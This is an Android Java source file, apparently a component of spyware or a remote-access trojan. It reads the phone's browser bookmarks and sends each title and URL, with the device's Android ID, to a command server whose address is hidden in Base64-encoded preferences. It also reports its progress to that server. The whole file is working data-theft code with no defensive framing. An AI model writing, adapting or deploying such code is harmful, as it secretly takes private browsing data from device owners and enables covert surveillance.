package com.asynctask;

import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

public class getBrowserBookmarks extends AsyncTask<String, Void, String> {
    String j = "";

    public getBrowserBookmarks(String j) {
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {

        String sel = Browser.BookmarkColumns.BOOKMARK + " = 1";
        Cursor mCur = MyApplication.getContext().getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
        if (mCur.moveToFirst()) {
            int i = 0;
            while (mCur.isAfterLast() == false) {
                if (i < Integer.parseInt(j)) {
//		                Log.i("com.connect", "Title: " + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
//		                Log.i("com.connect", "Link: " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));

                    try {
                        String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                        CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "[" + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX).replace(" ", "") + "] " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
                i++;
                mCur.moveToNext();
            }
        }
        mCur.close();

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Browser Bookmarks Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Get", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Getting Browser Bookmarks");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", true).commit();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
